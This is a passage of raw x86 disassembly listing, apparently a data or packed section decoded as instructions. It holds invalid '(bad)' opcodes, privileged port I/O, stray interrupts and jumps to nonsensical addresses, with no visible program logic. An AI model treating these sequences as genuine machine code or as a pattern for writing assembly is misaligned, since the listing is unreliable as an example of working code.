  4284ac:	add    esp,ecx
  4284ae:	mov    BYTE PTR [edx],dl
  4284b0:	mov    edx,0x5583f22b
  4284b5:	scas   eax,DWORD PTR es:[edi]
  4284b6:	inc    ebp
  4284b7:	xchg   DWORD PTR [ebp-0x5a],ecx
  4284ba:	push   es
  4284bb:	add    al,0x6f
  4284bd:	xchg   esi,eax
  4284be:	pop    ds
  4284bf:	cmp    BYTE PTR [ebp-0x21],dh
  4284c2:	xor    al,0xd
  4284c4:	add    ecx,esp
  4284c6:	sbb    BYTE PTR [ebp+0x7],ah
  4284c9:	nop
  4284ca:	push   es
  4284cb:	xor    ecx,edx
  4284cd:	xor    BYTE PTR [ebp+0x40],al
  4284d0:	sbb    dl,cl
  4284d2:	pop    ebp
  4284d3:	arpl   cx,bp
  4284d5:	mov    dh,0x2a
  4284d7:	ror    DWORD PTR [edi+0x17aea5aa],cl
  4284dd:	mov    eax,ds:0x22e9a270
  4284e2:	or     cl,dh
  4284e4:	push   es
  4284e5:	adc    eax,0x2f6d01d2
  4284ea:	mov    ah,0x81
  4284ec:	adc    al,0x51
  4284ee:	leave  
  4284ef:	cmp    al,0xad
  4284f1:	std    
  4284f2:	jno    0x42850e
  4284f4:	sbb    dl,BYTE PTR [ebx-0x34c1830c]
  4284fa:	fst    QWORD PTR [eax]
  4284fc:	add    DWORD PTR [ebx+0x74],0x99b52871
  428503:	loope  0x428580
  428505:	scas   al,BYTE PTR es:[edi]
  428506:	in     al,0xfb
  428508:	dec    ebx
  428509:	ja     0x4284e9
  42850b:	shl    BYTE PTR [esi-0x3baa7f79],1
  428511:	dec    ecx
  428512:	pop    eax
  428513:	fstp   QWORD PTR [ebp-0x79]
  428516:	and    BYTE PTR [edx],al
  428518:	sub    DWORD PTR [ebp+0x518d1aa8],ecx
  42851e:	or     BYTE PTR [esi],dl
  428520:	in     eax,dx
  428521:	xchg   esi,eax
  428522:	dec    ebx
  428523:	push   ss
  428524:	dec    edi
  428525:	stc    
  428526:	push   ebx
  428527:	push   eax
  428528:	dec    edx
  428529:	loope  0x428588
  42852b:	out    0xfb,eax
  42852d:	ffreep st(2)
  42852f:	mov    esp,DWORD PTR [ebx+0x7b]
  428532:	cld    
  428533:	and    BYTE PTR [edi-0x2f96ad3],cl
  428539:	sbb    BYTE PTR [edx+0x78a93efb],0xf1
  428540:	push   ss
  428541:	ret    0x91cd
  428544:	popa   
  428545:	lock sub DWORD PTR [eax+0x5f],ecx
  428549:	mov    dh,0x39
  42854b:	mov    bh,0x22
  42854d:	fidiv  WORD PTR [edi]
  42854f:	out    dx,eax
  428550:	ds push esp
  428552:	pop    ds
  428553:	loopne 0x428525
  428555:	int    0xd9
  428557:	sbb    bl,ah
  428559:	adc    ebx,esp
  42855b:	pop    esi
  42855c:	jmp    0xe2aadee6
  428561:	aaa    
  428562:	out    dx,al
  428563:	pushf  
  428564:	push   ds
  428565:	mov    al,0x10
  428568:	(bad)  
  428569:	add    ecx,DWORD PTR [bp+0xd6]
  42856e:	pop    edi
  42856f:	out    0x8c,al
  428571:	fwait
  428572:	out    dx,eax
  428573:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428574:	xchg   edx,eax
  428575:	xchg   ebp,eax
  428576:	push   ds
  428577:	mov    al,ds:0xa15f6564
  42857c:	jg     0x4285c8
  42857e:	jmp    0x42857c
  428580:	sbb    BYTE PTR [ebx+0x4],0xbc
  428584:	fisubr DWORD PTR [eax+eax*8-0x52]
  428588:	test   eax,0x6cc98e6
  42858d:	(bad)  
  42858e:	push   ebp
  42858f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428590:	or     al,0x66
  428592:	pushf  
  428593:	mov    ebp,ebp
  428595:	daa    
  428596:	fcmovne st,st(3)
  428598:	jb     0x4285e1
  42859a:	sub    DWORD PTR [eax+0xa],ecx
  42859d:	nop
  42859e:	xchg   BYTE PTR [ebx],dl
  4285a0:	fisttp DWORD PTR [edx-0x44]
  4285a3:	imul   edx,DWORD PTR [esi-0x61289d3d],0xcdbc6426
  4285ad:	aad    0x51
  4285af:	(bad)  
  4285b0:	mov    dh,0xcb
  4285b2:	mov    al,ds:0xd0ee2279
  4285b7:	fst    st(0)
  4285b9:	arpl   WORD PTR [eax+0x2],cx
  4285bc:	xor    al,0x7e
  4285be:	ds loop 0x4285fd
  4285c1:	push   esp
  4285c2:	ins    BYTE PTR es:[edi],dx
  4285c3:	sub    BYTE PTR [ebp+0x2e],ah
  4285c6:	xchg   esp,eax
  4285c7:	jp     0x4285fd
  4285c9:	jle    0x4285ee
  4285cb:	pop    edi
  4285cc:	ins    DWORD PTR es:[edi],dx
  4285cd:	sub    eax,DWORD PTR ss:[edx-0x73]
  4285d1:	shr    BYTE PTR [ebx],cl
  4285d3:	or     DWORD PTR [eax-0x7159541d],edi
  4285d9:	push   0x331f962b
  4285de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4285df:	call   0x5264a631
  4285e4:	repnz pop ecx
  4285e6:	int    0x45
  4285e8:	sbb    BYTE PTR [esi+edx*1+0x8c87],ah
  4285ef:	add    BYTE PTR [eax],al
  4285f1:	add    BYTE PTR [edx],dl
  4285f3:	adc    BYTE PTR [eax-0x41c16dc2],0xac
  4285fa:	retf   0x4cd7
  4285fd:	ins    BYTE PTR es:[edi],dx
  4285fe:	stos   BYTE PTR es:[edi],al
  4285ff:	fstp   DWORD PTR [edx-0x5e]
  428602:	ins    DWORD PTR es:[edi],dx
  428603:	std    
  428604:	add    DWORD PTR [eax],eax
  428606:	sbb    BYTE PTR [eax],al
  428608:	add    BYTE PTR [eax],al
  42860a:	repnz jmp 0xf01b:0xf23e191
  428612:	(bad)  
  428613:	jne    0x428633
  428615:	lahf   
  428616:	mov    ebp,0xdcae48aa
  42861b:	mov    ebx,esp
  42861d:	rcr    BYTE PTR [ebx+0x26],0xa8
  428621:	.byte 0x5
